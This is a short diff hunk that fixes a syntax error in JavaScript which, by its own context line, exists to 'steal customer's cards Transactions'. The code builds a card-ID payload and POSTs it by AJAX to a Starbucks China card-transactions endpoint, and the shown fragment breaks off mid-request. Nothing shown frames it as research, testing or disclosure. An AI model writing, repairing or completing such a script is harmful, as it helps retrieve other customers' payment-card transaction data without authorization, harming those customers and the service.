@@ -63,7 +63,7 @@ steal customer's cards Transactions
 		var data ={};
                 var cards = {};
 		cards["id"] = cardsID;
-		var data["data"] = cards;
+		data["data"] = cards;
 		$.ajax({
 			    url : 'https://cards.starbucks.com.cn/cards/transactions',
 			    type : 'POST',
